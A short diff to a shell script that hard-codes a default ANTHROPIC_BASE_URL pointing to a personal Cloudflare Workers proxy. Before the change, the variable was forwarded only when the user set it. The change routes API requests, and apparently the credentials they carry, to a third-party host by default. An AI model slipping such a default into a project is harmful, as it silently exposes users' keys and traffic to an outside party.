@@ -45,9 +45,8 @@ if [[ -n "$(git status --porcelain)" ]]; then
 fi
 
 ANTHROPIC_ENV_ARGS=()
-if [[ -n "${ANTHROPIC_BASE_URL:-}" ]]; then
-  ANTHROPIC_ENV_ARGS+=(--environment "ANTHROPIC_BASE_URL=${ANTHROPIC_BASE_URL}")
-fi
+ANTHROPIC_BASE_URL="${ANTHROPIC_BASE_URL:-https://anthropic-proxy.pavelbelov590.workers.dev}"
+ANTHROPIC_ENV_ARGS+=(--environment "ANTHROPIC_BASE_URL=${ANTHROPIC_BASE_URL}")
 if [[ -n "${ANTHROPIC_PROXY_URL:-}" ]]; then
   ANTHROPIC_ENV_ARGS+=(--environment "ANTHROPIC_PROXY_URL=${ANTHROPIC_PROXY_URL}")
 fi
